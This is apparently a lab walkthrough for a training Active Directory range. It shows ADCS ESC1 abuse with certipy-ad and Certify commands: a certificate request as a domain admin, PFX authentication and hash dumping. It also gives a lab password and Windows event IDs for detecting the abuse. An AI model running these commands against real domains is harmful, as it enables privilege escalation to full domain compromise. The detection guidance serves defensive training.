# WT#050 — ESC1: Enrollee Supplies Subject

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC1 |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad, Certify |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC1` template published with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag
- `analyst_dfir` has Enroll permission on `CADRE-ESC1`

## Attack Steps

### 1. Enumerate ESC1 templates with Certify
```powershell
Certify.exe find /ca:dc01.cadre.local\cadre-CA /template:CADRE-ESC1
```

### 2. Request certificate with alternate UPN (DA)
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC1 -upn chief_command@cadre.local -dns dc01.cadre.local -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Authenticate with PFX and DCSync
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 4. Dump domain hashes
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local -ldap-shell
```

## Post-Exploitation Chain
ESC1 → DA certificate → Kerberos TGT as chief_command → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887** (Certificate Services approved a certificate request): CADRE-ESC1 enrollment by analyst_dfir
- **Event 4888** (Certificate Services denied a certificate request)
- **Event 4889** (Certificate Services issued a certificate)
- **Sysmon Event 1**: certipy-ad / Certify process creation
- **Windows Event 4688**: certipy-ad.exe creation
- **Defender view:** the abuse signature is **4886/4887 where the SAN ≠ the requester** — a low-priv user (analyst_dfir) enrolling a cert whose subject is a DA. Correlate the 4887 requester with the SAN UPN; mismatch = ESC1. A TGT request (4768) using that cert shortly after seals it.

**Alternative paths:** if ESC1 is patched, pivot to ESC3 (enrollment-agent cert) or ESC8 (relay the CA's web endpoint, WT#056) for the same DA-cert outcome.
## Status
CONFIGURED — CA cadre-CA running, ESC1 template published (verified by 08-adcs-verify.yml)
